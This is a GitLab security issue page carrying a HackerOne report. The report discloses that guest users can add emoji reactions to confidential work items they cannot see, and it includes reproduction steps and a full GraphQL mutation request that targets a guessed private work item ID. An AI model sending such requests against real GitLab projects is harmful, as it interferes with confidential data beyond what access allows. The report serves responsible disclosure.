=== Content from gitlab.com_07b34c08_20250114_232358.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Guest users can react (emojis) on confidential work items which they cant see in a project

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2036500](https://hackerone.com/reports/2036500)** by `ashish_r_padelkar` on 2023-06-23, assigned to [@ottilia\_westerlund](/ottilia_westerlund "Ottilia Westerlund"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hello,

Confidential tasks can be created for a issue within a project. These confidential tasks (work items) are created as issues and are visible only to `Reporters or Higher` user roles.

There is a bug where guest users within a project can react with emojis to such private tasks/work item even when they are confidential and cant be seen.

##### Steps to reproduce

1.Go to `https://gitlab.com/<groupNamespace>/<projectNamespace>/-/issues` and create an issue.

2.Now add confidential task to it using below option.

[![Screen_Shot_2023-06-23_at_8.43.38_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/1fd0726d5b361ab862b50f6219c43152b54f6503/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35653431336631612d636630662d346134642d616531652d3038636135623263383934342f53637265656e5f53686f745f323032332d30362d32335f61745f382e34332e33385f504d2e706e67)

3.Add a guest user to your project or group at `https://gitlab.com/groups/<groupNamespace>/-/group_members`.

4.Login as guest user.

5.Go to the issue created in step1.

6.You see the issue but not the task as its private.

7.Guess the private task item ID and replace it in below graphql request.

```
POST /api/graphql HTTP/2
Host: gitlab.com
Cookie: 1
Content-Length: 316
X-Gitlab-Feature-Category: team_planning
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
X-Csrf-Token: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-Ch-Ua-Platform: "macOS"
Origin: https://gitlab.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://gitlab.com/groupjune23/latest_project/-/work_items/25
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

[{"operationName":"updateWorkItemAwardEmojiWidget","variables":{"input":{"awardableId":"gid://gitlab/WorkItem/128497667","name":"thumbsup"}},"query":"mutation updateWorkItemAwardEmojiWidget($input: AwardEmojiToggleInput!) {\n  awardEmojiToggle(input: $input) {\n    errors\n    toggledOn\n    __typename\n  }\n}\n"}]
```

Where `128497667` is the private task ID.

8.Also replace your `Cookie` and `X-Csrf-Token`.

9.Send the request and it will be successful.

Now as an admin, check the private work item/task item . You should see `thumbsup` reaction appeared on it.This happens despite guest user cant see that task.

##### What is the current *bug* behavior?

Guest users can react emojis on private work items which they cant see within a project.

##### What is the expected *correct* behavior?

Only users who has access to private work items should be able to react on it.

##### Output of checks

This bug happens on GitLab.com. `GitLab Enterprise Edition 16.2.0-pre 2a4d9de2b78`

Regards,

Ashish

#### Impact

Guest users can react on confidential work items which they cant see in a project

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screen\_Shot\_2023-06-23\_at\_8.43.38\_PM.png](https://h1.sec.gitlab.net/a/5e413f1a-cf0f-4a4d-ae1e-08ca5b2c8944/Screen_Shot_2023-06-23_at_8.43.38_PM.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


